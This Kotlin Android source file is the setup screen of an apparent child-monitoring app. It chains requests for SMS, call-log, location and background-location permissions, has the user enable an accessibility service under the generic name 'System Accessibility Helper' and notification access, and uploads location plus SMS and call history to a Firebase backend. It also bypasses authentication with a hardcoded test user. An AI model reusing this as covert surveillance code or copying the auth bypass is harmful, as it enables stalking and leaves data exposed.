package com.device.guardian.service.ui

import android.content.Context
import android.content.Intent
import android.net.Uri
import com.device.guardian.service.R
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.accessibility.AccessibilityManager
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.device.guardian.service.databinding.ActivitySetupBinding
import com.device.guardian.service.service.GuardianAccessibilityService
import com.device.guardian.service.service.GuardianNotificationService
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.launch
import android.os.BatteryManager
import android.content.IntentFilter
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import kotlinx.coroutines.tasks.await
import com.google.firebase.auth.FirebaseAuth
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.ExistingPeriodicWorkPolicy
import com.device.guardian.service.worker.SyncWorker
import java.util.concurrent.TimeUnit

class SetupActivity : AppCompatActivity() {

    private lateinit var binding: ActivitySetupBinding
    private lateinit var prefs: com.device.guardian.service.utils.PrefsManager
    private val auth by lazy { FirebaseAuth.getInstance() }

    // ── Permission Launchers (chained sequentially) ───────────────────────────

    // Chain step 3: SMS & Calls (final step)
    private val requestSmsCallsPermissionLauncher = registerForActivityResult(
        androidx.activity.result.contract.ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.values.all { it }
        if (allGranted) {
            Toast.makeText(this, "SMS & Call permissions granted ✓", Toast.LENGTH_SHORT).show()
        } else {
            Toast.makeText(this, "Some SMS/Call permissions denied. Logs might be partial.", Toast.LENGTH_LONG).show()
        }
        refreshAllStatuses()
        // All permission steps done — import history & schedule sync
        onAllPermissionsHandled()
    }

    // Chain step 2: Background Location → then SMS/Calls
    private val requestBackgroundLocationLauncher = registerForActivityResult(
        androidx.activity.result.contract.ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val bgGranted = permissions[android.Manifest.permission.ACCESS_BACKGROUND_LOCATION] ?: false
        if (bgGranted) {
            Toast.makeText(this, "Background location granted ✓", Toast.LENGTH_SHORT).show()
        } else {
            Toast.makeText(this, "Background location denied — location may not work when app is closed", Toast.LENGTH_LONG).show()
        }
        refreshAllStatuses()

        // Chain → request SMS/Calls permissions next
        if (!isSmsCallsPermissionGranted()) {
            requestSmsCallsPermissionLauncher.launch(
                arrayOf(
                    android.Manifest.permission.RECEIVE_SMS,
                    android.Manifest.permission.READ_SMS,
                    android.Manifest.permission.READ_PHONE_STATE,
                    android.Manifest.permission.READ_CALL_LOG
                )
            )
        } else {
            onAllPermissionsHandled()
        }
    }

    // Chain step 1: Foreground Location → then Background Location → then SMS/Calls
    private val requestForegroundLocationLauncher = registerForActivityResult(
        androidx.activity.result.contract.ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val fineGranted = permissions[android.Manifest.permission.ACCESS_FINE_LOCATION] ?: false
        val coarseGranted = permissions[android.Manifest.permission.ACCESS_COARSE_LOCATION] ?: false
        if (fineGranted || coarseGranted) {
            Toast.makeText(this, "Location permission granted ✓", Toast.LENGTH_SHORT).show()
            // Chain → request background location on Q+
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                requestBackgroundLocationLauncher.launch(
                    arrayOf(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                )
            } else {
                // Pre-Q: no background location needed, go straight to SMS/Calls
                chainToSmsCallsIfNeeded()
            }
        } else {
            Toast.makeText(this, "Location permission denied", Toast.LENGTH_SHORT).show()
            // Still chain to SMS/Calls even if location denied
            chainToSmsCallsIfNeeded()
        }
        refreshAllStatuses()
    }

    // BUG-R2-06: POST_NOTIFICATIONS launcher for Android 13+ (chain step 0)
    private val requestNotificationsLauncher = registerForActivityResult(
        androidx.activity.result.contract.ActivityResultContracts.RequestPermission()
    ) { granted ->
        if (granted) {
            Toast.makeText(this, "Notification permission granted ✓", Toast.LENGTH_SHORT).show()
        }
        // Chain → request location next
        chainToLocationIfNeeded()
    }

    // ── Lifecycle ─────────────────────────────────────────────────────────────

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivitySetupBinding.inflate(layoutInflater)
        setContentView(binding.root)
        prefs = com.device.guardian.service.utils.PrefsManager(this)

        setupButtons()
        restoreSavedParentId()
    }

    override fun onResume() {
        super.onResume()
        refreshAllStatuses()

        // If app is fully configured, trigger background sync
        if (isParentIdSaved() && isLocationPermissionGranted() && isSmsCallsPermissionGranted()) {
            syncStatusNowOnSetup()
        }
    }

    // ── Setup Buttons ─────────────────────────────────────────────────────────

    private fun setupButtons() {

        // Step 1 — Save Parent ID
        binding.btnSaveParentId.setOnClickListener {
            val id = binding.etParentId.text.toString().trim()
            if (id.length >= 4) {
                binding.btnSaveParentId.isEnabled = false
                binding.btnSaveParentId.text = "Connecting..."

                // Bypassed Firebase Auth for testing/checking purposes
                prefs.parentId = id
                prefs.childUid = "test_child_uid"
                Toast.makeText(this, "Connected to Parent ✓", Toast.LENGTH_SHORT).show()
                refreshAllStatuses()
                binding.btnSaveParentId.isEnabled = true
                binding.btnSaveParentId.text = "Save ID"

                val db = com.device.guardian.service.data.local.AppDatabase.getInstance(this)
                lifecycleScope.launch {
                    try {
                        db.messageDao().resetSyncStatus()
                    } catch (_: Exception) {}
                }

                syncStatusNowOnSetup()

                val repo = com.device.guardian.service.data.remote.FirebaseRepository(db.messageDao(), this)
                lifecycleScope.launch {
                    try {
                        repo.syncPending()
                        Toast.makeText(this@SetupActivity, "Linked to Parent Dashboard ✓", Toast.LENGTH_SHORT).show()
                    } catch (e: Exception) {
                        Toast.makeText(this@SetupActivity, "Sync Error: ${e.message}", Toast.LENGTH_LONG).show()
                    }
                }

                // BUG-R2-01 FIX: Immediately start the permission request chain
                // after saving the parent code — Location → Background → SMS/Calls
                startPermissionChain()

            } else {
                binding.etParentId.error = "Must be at least 4 chars"
            }
        }

        // Step 2 — Open Accessibility Settings
        binding.btnEnableAccessibility.setOnClickListener {
            try {
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                startActivity(intent)
                Toast.makeText(
                    this,
                    "Find 'System Accessibility Helper' and enable it",
                    Toast.LENGTH_LONG
                ).show()
            } catch (e: Exception) {
                startActivity(Intent(Settings.ACTION_SETTINGS))
            }
        }

        // Step 3 — Battery Optimization
        binding.btnBatteryOptimization.setOnClickListener {
            if (isBatteryOptimizationDisabled()) {
                Toast.makeText(this, "Already configured ✓", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            try {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivity(intent)
            } catch (e: Exception) {
                val intent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
                startActivity(intent)
                Toast.makeText(this, "Find this app and select 'Unrestricted'", Toast.LENGTH_LONG).show()
            }
        }

        // Step 4 — Request Location Permission (manual fallback)
        binding.btnEnableLocation.setOnClickListener {
            if (isLocationPermissionGranted()) {
                Toast.makeText(this, "Permission already granted ✓", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            requestForegroundLocationLauncher.launch(
                arrayOf(
                    android.Manifest.permission.ACCESS_FINE_LOCATION,
                    android.Manifest.permission.ACCESS_COARSE_LOCATION
                )
            )
        }

        // Step 5 — Notification Access
        binding.btnEnableNotification.setOnClickListener {
            val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
            try {
                startActivity(intent)
                Toast.makeText(this, "Enable Guardian for Notification Access", Toast.LENGTH_LONG).show()
            } catch (e: Exception) {
                startActivity(Intent(Settings.ACTION_SETTINGS))
            }
        }

        // Step 6 — SMS & Calls Tracking (manual fallback)
        binding.btnEnableSmsCalls.setOnClickListener {
            if (isSmsCallsPermissionGranted()) {
                Toast.makeText(this, "Permissions already granted ✓", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            requestSmsCallsPermissionLauncher.launch(
                arrayOf(
                    android.Manifest.permission.RECEIVE_SMS,
                    android.Manifest.permission.READ_SMS,
                    android.Manifest.permission.READ_PHONE_STATE,
                    android.Manifest.permission.READ_CALL_LOG
                )
            )
        }
    }

    // ── Permission Chain (BUG-R2-01 fix) ──────────────────────────────────────

    /**
     * Starts the full sequential permission chain:
     * POST_NOTIFICATIONS (API 33+) → Location → Background Location → SMS/Calls
     * Each step chains into the next automatically.
     */
    private fun startPermissionChain() {
        // Step 0: POST_NOTIFICATIONS for API 33+ (BUG-R2-06 fix)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
            checkSelfPermission(android.Manifest.permission.POST_NOTIFICATIONS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            requestNotificationsLauncher.launch(android.Manifest.permission.POST_NOTIFICATIONS)
            return
        }
        chainToLocationIfNeeded()
    }

    private fun chainToLocationIfNeeded() {
        if (!isLocationPermissionGranted()) {
            requestForegroundLocationLauncher.launch(
                arrayOf(
                    android.Manifest.permission.ACCESS_FINE_LOCATION,
                    android.Manifest.permission.ACCESS_COARSE_LOCATION
                )
            )
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
                   checkSelfPermission(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            requestBackgroundLocationLauncher.launch(
                arrayOf(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            )
        } else {
            chainToSmsCallsIfNeeded()
        }
    }

    private fun chainToSmsCallsIfNeeded() {
        if (!isSmsCallsPermissionGranted()) {
            requestSmsCallsPermissionLauncher.launch(
                arrayOf(
                    android.Manifest.permission.RECEIVE_SMS,
                    android.Manifest.permission.READ_SMS,
                    android.Manifest.permission.READ_PHONE_STATE,
                    android.Manifest.permission.READ_CALL_LOG
                )
            )
        } else {
            onAllPermissionsHandled()
        }
    }

    /**
     * Called when all permission steps in the chain have been handled.
     * Imports local history and schedules the background SyncWorker.
     */
    private fun onAllPermissionsHandled() {
        refreshAllStatuses()
        syncStatusNowOnSetup()
        scheduleSyncWorker() // BUG-R2-05 fix
    }

    // ── SyncWorker Scheduling (BUG-R2-05 fix) ────────────────────────────────

    private fun scheduleSyncWorker() {
        val syncRequest = PeriodicWorkRequestBuilder<SyncWorker>(15, TimeUnit.MINUTES)
            .build()
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "GuardianSyncWork",
            ExistingPeriodicWorkPolicy.KEEP,
            syncRequest
        )
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    private fun restoreSavedParentId() {
        val saved = prefs.parentId
        if (!saved.isNullOrBlank()) {
            binding.etParentId.setText(saved)
        }
    }

    // ── Status Refresh ─────────────────────────────────────────────────────────

    private fun refreshAllStatuses() {
        updateStep1Status()
        updateStep2Status()
        updateStep3Status()
        updateStep4Status()
        updateStep5Status()
        updateStep6Status()
        updateFinalBanner()
    }

    private fun updateStep1Status() {
        val saved = prefs.parentId
        val done = !saved.isNullOrBlank()
        binding.tvStep1Status.text = if (done) "✅ Saved" else "⬜ Pending"
        binding.tvStep1Status.setTextColor(
            getColor(if (done) R.color.status_success else R.color.status_pending)
        )
    }

    private fun updateStep2Status() {
        val active = isAccessibilityServiceEnabled()
        binding.tvStep2Status.text = if (active) "✅ Active" else "⬜ Pending"
        binding.tvStep2Status.setTextColor(
            getColor(if (active) R.color.status_success else R.color.status_pending)
        )
        binding.btnEnableAccessibility.text =
            if (active) "Service Active ✓" else "Open Accessibility Settings"
        binding.btnEnableAccessibility.isEnabled = !active
    }

    private fun updateStep3Status() {
        val optimized = isBatteryOptimizationDisabled()
        binding.tvStep3Status.text = if (optimized) "✅ Done" else "⬜ Pending"
        binding.tvStep3Status.setTextColor(
            getColor(if (optimized) R.color.status_success else R.color.status_pending)
        )
        binding.btnBatteryOptimization.text =
            if (optimized) "Battery Configured ✓" else "Disable Battery Optimization"
        binding.btnBatteryOptimization.isEnabled = !optimized
    }

    private fun updateStep4Status() {
        val granted = isLocationPermissionGranted()
        binding.tvStep4Status.text = if (granted) "✅ Done" else "⬜ Pending"
        binding.tvStep4Status.setTextColor(
            getColor(if (granted) R.color.status_success else R.color.status_pending)
        )
        binding.btnEnableLocation.text =
            if (granted) "Location Configured ✓" else "Grant Location Access"
        binding.btnEnableLocation.isEnabled = !granted
    }

    private fun updateStep5Status() {
        val active = isNotificationServiceEnabled()
        binding.tvStep5Status.text = if (active) "✅ Active" else "⬜ Pending"
        binding.tvStep5Status.setTextColor(
            getColor(if (active) R.color.status_success else R.color.status_pending)
        )
        binding.btnEnableNotification.text =
            if (active) "Notification Capture Active ✓" else "Grant Notification Access"
        binding.btnEnableNotification.isEnabled = !active
    }

    private fun updateStep6Status() {
        val active = isSmsCallsPermissionGranted()
        binding.tvStep6Status.text = if (active) "✅ Done" else "⬜ Pending"
        binding.tvStep6Status.setTextColor(
            getColor(if (active) R.color.status_success else R.color.status_pending)
        )
        binding.btnEnableSmsCalls.text =
            if (active) "SMS & Call Tracking Active ✓" else "Grant SMS & Call Access"
        binding.btnEnableSmsCalls.isEnabled = !active
    }

    private fun updateFinalBanner() {
        val allDone = isParentIdSaved() &&
                      isAccessibilityServiceEnabled() &&
                      isBatteryOptimizationDisabled() &&
                      isLocationPermissionGranted() &&
                      isNotificationServiceEnabled() &&
                      isSmsCallsPermissionGranted()

        if (allDone) {
            binding.tvFinalStatus.text = "✅ Monitoring Active"
            binding.tvFinalSubtext.text = "All steps complete — service is running"
            binding.cardStatus.setCardBackgroundColor(getColor(R.color.status_success))
        } else {
            binding.tvFinalStatus.text = "⚠ Setup Incomplete"
            binding.tvFinalSubtext.text = "Complete all 6 steps above"
            binding.cardStatus.setCardBackgroundColor(
                resources.getColor(android.R.color.black, theme)
            )
        }
    }

    // ── Checks ─────────────────────────────────────────────────────────────────

    private fun isParentIdSaved(): Boolean {
        return !prefs.parentId.isNullOrBlank()
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val enabledServices = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false

        val serviceName = "${packageName}/${GuardianAccessibilityService::class.java.canonicalName}"
        return enabledServices.contains(serviceName, ignoreCase = true)
    }

    private fun isBatteryOptimizationDisabled(): Boolean {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        return pm.isIgnoringBatteryOptimizations(packageName)
    }

    private fun isLocationPermissionGranted(): Boolean {
        return checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED ||
               checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED
    }

    private fun isNotificationServiceEnabled(): Boolean {
        val enabledListeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        val serviceName = "${packageName}/${GuardianNotificationService::class.java.canonicalName}"
        return enabledListeners?.contains(serviceName) == true
    }

    private fun isSmsCallsPermissionGranted(): Boolean {
        return checkSelfPermission(android.Manifest.permission.RECEIVE_SMS) == android.content.pm.PackageManager.PERMISSION_GRANTED &&
               checkSelfPermission(android.Manifest.permission.READ_SMS) == android.content.pm.PackageManager.PERMISSION_GRANTED &&
               checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == android.content.pm.PackageManager.PERMISSION_GRANTED &&
               checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) == android.content.pm.PackageManager.PERMISSION_GRANTED
    }

    private fun syncStatusNowOnSetup() {
        val id = prefs.parentId
        if (id.isNullOrBlank()) return
        
        val db = com.device.guardian.service.data.local.AppDatabase.getInstance(this)
        val repo = com.device.guardian.service.data.remote.FirebaseRepository(db.messageDao(), this)
        lifecycleScope.launch {
            try {
                // Get battery info
                val batteryFilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
                val batteryStatus = registerReceiver(null, batteryFilter)
                val level = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
                val scale = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
                val batteryPct = if (level >= 0 && scale > 0) (level * 100 / scale) else -1
                val isCharging = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) == BatteryManager.BATTERY_STATUS_CHARGING

                // Get online status
                val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
                val network = cm.activeNetwork
                val caps = network?.let { cm.getNetworkCapabilities(it) }
                val isOnline = caps?.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) == true

                // Get location (if permission granted)
                var lat: Double? = null
                var lon: Double? = null
                if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    try {
                        val fusedLocationClient = com.google.android.gms.location.LocationServices.getFusedLocationProviderClient(this@SetupActivity)
                        val location = fusedLocationClient.getCurrentLocation(
                            com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY, null
                        ).await()
                        if (location != null) {
                            lat = location.latitude
                            lon = location.longitude
                        }
                    } catch (_: Exception) {}
                }

                repo.syncDeviceStatus(
                    batteryLevel = batteryPct,
                    isCharging = isCharging,
                    isOnline = isOnline,
                    latitude = lat,
                    longitude = lon
                )

                // Import last 20 SMS + 20 call logs from device
                com.device.guardian.service.utils.LocalLogImporter.importHistory(this@SetupActivity, db, repo)
            } catch (_: Exception) {}
        }
    }
}
